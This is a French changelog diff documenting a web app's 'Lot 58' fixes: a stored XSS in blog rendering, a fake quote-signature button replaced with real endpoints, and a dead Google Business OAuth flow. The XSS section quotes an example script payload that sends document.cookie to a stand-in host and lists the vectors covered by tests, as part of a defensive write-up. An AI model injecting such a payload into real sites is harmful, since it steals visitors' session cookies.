@@ -4,6 +4,111 @@ Ce document liste **exactement** ce qui a changé. Rapport détaillé dans [`AUD
 
 ---
 
+# 🟢 Lot 58 — Fix bugs MAJEURS : XSS blog, signature devis pro fake, Google Business OAuth mort
+
+Suite au 2e audit complet, 3 bugs MAJEURS avaient été identifiés. Ce lot les ferme intégralement. Les 2 bugs MINEURS restants (SEC1bis rate-limit availability, SEC2 Zod my-businesses) seront traités au Lot 59.
+
+## MAJ1 — XSS stored dans les articles de blog
+
+**Problème** : `src/app/[slug]/blog/[postSlug]/page.tsx:145` faisait un mini-renderer markdown qui injectait le contenu utilisateur (article écrit par le pro) directement dans `dangerouslySetInnerHTML` **sans échappement**. Un compte pro compromis ou un membre équipe malveillant (rôle admin/employee) pouvait coller `<script>fetch('https://mal.com?c='+document.cookie)</script>` dans un article → XSS stored exécuté chez tous les visiteurs de la vitrine (redirection malicieuse, phishing, exfiltration formulaire booking).
+
+**Fix** :
+- Nouvelle lib `src/lib/blog-renderer.ts` avec `escapeHtml()` + `renderBlogContent()` pures
+- Approche whitelist stricte : le texte utilisateur est échappé AVANT interpolation dans les tags de sortie (`<h1>`, `<h2>`, `<li>`, `<p>`)
+- Zéro dépendance externe (`sanitize-html` = 200KB, DOMPurify server = jsdom lourd) — un renderer whitelist est plus sûr qu'un sanitizer permissif
+- Iso-fonctionnel : les 6 formats supportés (`#`, `##`, `-`, `1.`, `**...**`, lignes vides) rendent exactement pareil
+- 23 tests unitaires dans `tests/unit/blog-renderer.test.ts` :
+  - 9 tests XSS resistance (`<script>`, `<img onerror>`, `<iframe>`, `data:text/html`, `javascript:`, `<svg onload>`, apostrophe breakout, `<style>` avec expression, escapeHtml)
+  - 14 tests formats markdown (H1, H2, listes, gras, accents FR, edge cases)
+
+## MAJ2 — Signature devis côté pro complètement fake
+
+**Problème** : `src/app/dashboard/quotes/[id]/page.tsx:136` (TODO Lot 20 jamais fait). Le pro cliquait "Signer" → SignaturePad → toast "Signature enregistrée localement — endpoint POST /sign à câbler au Lot 20" + update optimiste qui disparaissait au refresh. **Rien n'était persisté.**
+
+**Fix** — remplacement du bouton fake par 2 actions RÉELLES :
+
+1. **"Envoyer pour signature" (à distance)** — utilise l'endpoint existant `POST /api/quotes/[id]/send-signature` (Lot 38). Envoie un magic-link au client par email. Bouton désactivé si le client n'a pas d'email.
+
+2. **"Signer en présentiel" (nouveau endpoint)** — pour le cas où le pro visite le client qui signe sur sa tablette. Nouvel endpoint `POST /api/quotes/[id]/mark-signed` :
+   - Auth : `requireTeamPermission("quotes.edit_any")` — bloque le rôle viewer
+   - Ownership check via `businessId` (anti-IDOR)
+   - Validation Zod stricte : `typedName` (2-100 chars) + `signatureDataUrl` (data:image/*, cap 500KB) obligatoires
+   - Anti-double-signature : `WHERE isNull(signedAt)` atomique au UPDATE
+   - Hash de preuve identique à `/api/quotes/sign` (traçabilité audit cohérente)
+   - Notif interne au pro (traçabilité "signé en présentiel")
+   - Facture auto générée en fire-and-forget
+   - Rate-limit strict : 20/h (une signature = write DB + notif + génération PDF facture)
+
+**UX** : modal signature refactorée avec champ "Nom complet du signataire" obligatoire + bannière ambre "👉 Passez la tablette au client" pour clarifier que c'est le CLIENT qui signe, pas le pro.
+
+## MAJ3 — Google My Business OAuth stocke rien (feature fantôme)
+
+**Problème** : `/api/google/callback:47` (TODO oublié) — l'user cliquait "Connecter Google Business" → OAuth Google passait → callback recevait le `refresh_token` → **loggé puis jeté**. Redirection vers `?google=connected` qui mentait. La feature n'existait pas en réalité. Marketing (CGU, FAQ) promettait "avis Google Business vérifiés".
+
+**Analyse** : implémenter un vrai OAuth Google My Business demande validation Google (scope `business.manage` en review = semaines). Approche pragmatique v1 = **Place ID manuel** :
+
+**Fix** :
+- Supprimé les 2 routes mortes : `/api/google/callback` et `/api/google/connect` (0 consommateur, code fantôme)
+- Ajouté champ Zod `googlePlaceId` dans `PATCH /api/my-business` avec regex `[A-Za-z0-9_-]*` + persistance (`""` → `null` pour déconnecter)
+- Refonte `src/lib/google-reviews.ts` :
+  - Ajout `buildReviewLink(businessName, placeId)` avec fallback SERP si pas de Place ID
+  - Suppression du placeholder `YOUR_PLACE_ID` en dur
+  - `fetchGoogleReviews()` déjà OK (utilise Places API + `GOOGLE_PLACES_API_KEY`)
+- Nouveau composant `src/components/reviews/GoogleReviewsCard.tsx` — l'user récupère son Place ID sur https://developers.google.com/maps/documentation/places/web-service/place-id, le colle → badge "Configuré" + bouton "Tester le lien avis"
+- Remplacement de la bannière "Bientôt disponible" (fausse promesse) sur `/dashboard/reviews` par le vrai composant fonctionnel
+
+Le workflow est maintenant complet et honnête : l'user configure une fois son Place ID, les avis Google peuvent être importés et le lien "Laisser un avis" fonctionne.
+
+## Fichiers touchés
+
+- **Créés (4)** :
+  - `src/lib/blog-renderer.ts` (renderer markdown safe XSS)
+  - `src/app/api/quotes/[id]/mark-signed/route.ts` (signature présentiel)
+  - `src/components/reviews/GoogleReviewsCard.tsx` (config Place ID)
+  - `tests/unit/blog-renderer.test.ts` (23 tests)
+
+- **Modifiés (5)** :
+  - `src/app/[slug]/blog/[postSlug]/page.tsx` (utilise renderBlogContent)
+  - `src/app/dashboard/quotes/[id]/page.tsx` (2 vrais boutons + vrai handler)
+  - `src/app/api/my-business/route.ts` (schéma Zod + persistance googlePlaceId)
+  - `src/lib/google-reviews.ts` (refonte pragmatique, buildReviewLink)
+  - `src/app/dashboard/reviews/page.tsx` (intègre GoogleReviewsCard)
+
+- **Supprimés (2)** : `src/app/api/google/callback/route.ts` + `src/app/api/google/connect/route.ts` (feature fantôme)
+
+## Validations
+
+- `npx tsc --noEmit` → **0 erreur** ✅
+- `npx vitest run` → **886 tests / 76 fichiers verts** (avant 863/75, **+23 tests XSS**) ✅
+- `npx next build` → OK ✅ (routes `/api/google/callback` et `/api/google/connect` correctement retirées, seul `/api/google/calendar/*` reste — celui-ci fonctionne)
+
+## Impact business
+
+- **Sécurité vitrine** : la vitrine publique est maintenant immunisée contre le XSS via blog. Confiance user + SEO préservés (Google déteste les sites avec scripts inconnus)
+- **Devis** : le workflow est enfin **cohérent** — soit le client signe à distance (email magic-link), soit en présentiel (tablette du pro). Facture générée automatiquement dans les 2 cas. Plus de "je clique Signer mais rien ne se passe au refresh"
+- **Google Reviews** : promesse marketing enfin tenue. L'user peut vraiment importer ses avis Google + envoyer un lien direct "Laisser un avis" à chaque client post-RDV. Fin des fausses promesses "Bientôt disponible"
+- **Trust** : suppression de 2 endpoints fantômes qui promettaient une feature inexistante = alignement code/marketing
+
+## Actions post-déploiement
+
+Aucune action DB ou env vars requise. Optionnel :
+- **`GOOGLE_PLACES_API_KEY`** en env (déjà dans `.env.example`) — nécessaire pour `fetchGoogleReviews()` (import automatique des avis). Sans elle, seul le LIEN "Laisser un avis" fonctionne (déjà utile).
+- **Retirer manuellement l'app Google Cloud "Vitrix Business Manager"** si créée (le scope `business.manage` n'est plus utilisé).
+
+## Historique commits
+
+```
+1e29f57 lot 58 fix bugs majeurs: XSS blog stored + signature devis pro reelle (endpoint mark-signed) + Google Business OAuth mort remplace par Place ID manuel
+d16aff1 lot 57 nettoyage post-audit: rate-limit 11 routes account/* + parseFloat defensif + toasts erreur + rm GlobalSearch orphelin
+a0205ae auto-appli coupons Stripe pour crédits parrainage (ferme Lot 52)
+6fa8cc7 lot 56 export CSV analytics
+a697936 lot 55 command palette Cmd+K
+67343d7 lot 54 optimisation LCP landing
+bf7b5df lot 53 refonte digest email hebdomadaire
+```
+
+---
+
 # 🟢 Lot 57 — Nettoyage post-audit : rate-limit routes account/*, parseFloat défensif, toasts erreur, dead code
 
 Suite à l'audit complet réalisé au tour précédent, ce lot ferme les **4 bugs mineurs** identifiés (SEC1, DATA1, UX2, DEAD1). Aucun bug majeur ne restait à traiter.
